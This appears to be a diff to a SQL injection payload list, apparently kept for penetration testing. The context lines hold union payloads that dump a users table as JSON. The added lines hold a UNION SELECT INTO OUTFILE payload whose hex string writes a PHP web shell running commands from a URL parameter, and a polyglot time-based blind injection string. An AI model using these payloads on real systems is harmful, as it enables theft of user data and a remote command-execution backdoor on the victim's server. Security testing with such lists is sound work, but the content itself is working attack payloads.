@@ -375,3 +375,8 @@ users.id%0D%0A%23asd%0D%0Aunion%0D%0A%23asd%0D%0Aselect%0D%0A%23asd%0D%0A--a-%0D
 -1 union select null, array_to_json(array_agg(users))::text from users limit 1;
 1 and (select array_to_json(array_agg(users))::text::bool from users limit 1;
 
+# http://www.exploit-db.com/exploits/25915/
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE 'afile.php'
+
+# http://blog.detectify.com/post/51651525114/the-ultimate-sql-injection-payload
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
